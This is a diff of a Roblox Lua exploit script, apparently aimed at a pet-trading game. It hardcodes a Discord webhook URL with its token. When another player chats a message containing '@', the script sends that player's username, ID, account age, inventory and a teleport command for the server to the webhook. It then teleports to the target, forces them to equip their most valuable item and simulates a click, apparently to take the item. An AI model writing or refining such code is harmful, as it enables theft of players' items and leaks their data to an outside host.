@@ -4,7 +4,7 @@ local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 
@@ -18,6 +18,7 @@ local RARE_PETS = {
     ["Queen bee"] = true
 }
 
+-- Mouse click function
 local function mouse1click()
     local mouse = LocalPlayer:GetMouse()
     for _,v in next, getconnections(mouse.Button1Down) do
@@ -25,19 +26,36 @@ local function mouse1click()
     end
 end
 
-local function sendToWebhook(data)
-    local success, placeId = pcall(function() return game.PlaceId end)
-    local success2, jobId = pcall(function() return game.JobId end)
-    
-    local teleportScript = "game:GetService('TeleportService'):TeleportToPlaceInstance("
-    ..(success and tostring(placeId) or "nil")..", "
-    ..(success2 and ("'"..jobId.."'") or "nil")..")"
+-- Force first person view
+local function setFirstPerson()
+    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
+    LocalPlayer.CameraMaxZoomDistance = 0.5
+    LocalPlayer.CameraMinZoomDistance = 0.5
+end
 
-    local itemsText = data.items or "No items found"
-    local hasRarePet = false
+-- Look at target's head
+local function lookAtTarget(targetHead)
+    local camera = Workspace.CurrentCamera
+    local conn
+    conn = RunService.Heartbeat:Connect(function()
+        if targetHead and camera then
+            camera.CFrame = CFrame.new(camera.CFrame.p, targetHead.Position)
+        else
+            if conn then conn:Disconnect() end
+        end
+    end)
+    return conn
+end
+
+-- Send data to webhook
+local function sendToWebhook(data)
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local teleportScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
     
+    local hasRarePet = false
     for petName in pairs(RARE_PETS) do
-        if string.find(itemsText, petName) then
+        if string.find(data.items, petName) then
             hasRarePet = true
             break
         end
@@ -50,22 +68,22 @@ local function sendToWebhook(data)
         ["fields"] = {
             {
                 ["name"] = "Username",
-                ["value"] = data.username or "N/A",
+                ["value"] = data.username,
                 ["inline"] = true
             },
             {
                 ["name"] = "UserID",
-                ["value"] = tostring(data.userId or "N/A"),
+                ["value"] = tostring(data.userId),
                 ["inline"] = true
             },
             {
                 ["name"] = "Account Age",
-                ["value"] = tostring(data.accountAge or "N/A"),
+                ["value"] = tostring(data.accountAge),
                 ["inline"] = true
             },
             {
                 ["name"] = "Items",
-                ["value"] = itemsText,
+                ["value"] = data.items,
                 ["inline"] = false
             }
         }
@@ -76,11 +94,13 @@ local function sendToWebhook(data)
         ["embeds"] = {embed}
     }
 
+    local jsonPayload = HttpService:JSONEncode(payload)
     pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
+        HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
     end)
 end
 
+-- Get best item from backpack
 local function getBestItem(backpack)
     local bestItem = nil
     local bestValue = 0
@@ -123,95 +143,80 @@ local function getBestItem(backpack)
     return bestItem
 end
 
+-- Main interaction function
 local function teleportAndInteract(target)
-    local character = LocalPlayer.Character
-    if not character then
-        character = LocalPlayer.CharacterAdded:Wait()
-    end
-    
+    -- Get characters
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = character:WaitForChild("Humanoid")
     local rootPart = character:WaitForChild("HumanoidRootPart")
 
-    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-    humanoid.CameraOffset = Vector3.new(0, 0, 0)
-    humanoid.AutoRotate = false
-
-    local targetCharacter = target.Character
-    if not targetCharacter then
-        targetCharacter = target.CharacterAdded:Wait()
-    end
-    
+    -- Get target character
+    local targetCharacter = target.Character or target.CharacterAdded:Wait()
+    local targetHead = targetCharacter:WaitForChild("Head")
     local targetTorso = targetCharacter:FindFirstChild("UpperTorso") or targetCharacter:FindFirstChild("Torso")
-    if not targetTorso then
-        targetTorso = targetCharacter:WaitForChild("UpperTorso", 5) or targetCharacter:WaitForChild("Torso", 5)
-        if not targetTorso then return end
-    end
 
+    -- Teleport to target
     rootPart.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
-    humanoid.CameraOffset = Vector3.new(0, 0, 0)
 
-    local conn
-    conn = RunService.Heartbeat:Connect(function()
-        if targetCharacter and targetTorso and rootPart then
-            rootPart.CFrame = CFrame.new(rootPart.Position, targetTorso.Position) * CFrame.new(0, 0, -4)
-        else
-            if conn then conn:Disconnect() end
-        end
-    end)
+    -- Set first person and look at target
+    setFirstPerson()
+    local lookConn = lookAtTarget(targetHead)
 
+    -- Force equip best item
     local backpack = target:FindFirstChild("Backpack")
-    if backpack then
+    if backpack and targetCharacter:FindFirstChild("Humanoid") then
         local bestItem = getBestItem(backpack)
-        if bestItem and targetCharacter:FindFirstChild("Humanoid") then
+        if bestItem then
             targetCharacter.Humanoid:EquipTool(bestItem)
         end
     end
 
-    task.wait(0.5)
-    local screenPos = Vector2.new(0.5, 0.5)
-    pcall(function()
-        UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
-        mouse1click()
-    end)
-    
-    task.wait(5)
-    if conn then conn:Disconnect() end
-end
-
-local function onPlayerChatted(player, message)
-    if player == LocalPlayer then return end
-    if not string.find(message, "@") then return end
-
-    -- Get player items
+    -- Send webhook data
     local items = {}
-    local backpack = player:FindFirstChild("Backpack")
     if backpack then
         for _, tool in ipairs(backpack:GetChildren()) do
             table.insert(items, tool.Name)
         end
     end
 
-    -- Send webhook data
     local data = {
-        username = player.Name,
-        userId = player.UserId,
-        accountAge = player.AccountAge,
+        username = target.Name,
+        userId = target.UserId,
+        accountAge = target.AccountAge,
         items = #items > 0 and table.concat(items, "\n") or "No items found"
     }
     
     sendToWebhook(data)
-    
-    -- Teleport and interact
-    local success, err = pcall(function()
-        teleportAndInteract(player)
+
+    -- Force click after delay
+    task.wait(0.5)
+    pcall(function()
+        UserInputService:SetMouseLocation(0.5, 0.5)
+        mouse1click()
     end)
-    
-    if not success then
-        warn("Error during teleport/interact: "..err)
-    end
+
+    -- Wait and cleanup
+    task.wait(5)
+    if lookConn then lookConn:Disconnect() end
 end
 
--- Connect chat listeners
+-- Chat detection
+local function onPlayerChatted(player, message)
+    if player == LocalPlayer then return end
+    if not string.find(message, "@") then return end
+
+    -- Run in a coroutine to avoid yielding errors
+    coroutine.wrap(function()
+        local success, err = pcall(function()
+            teleportAndInteract(player)
+        end)
+        if not success then
+            warn("Error: "..err)
+        end
+    end)()
+end
+
+-- Set up chat listeners
 for _, player in ipairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
         player.Chatted:Connect(function(message)
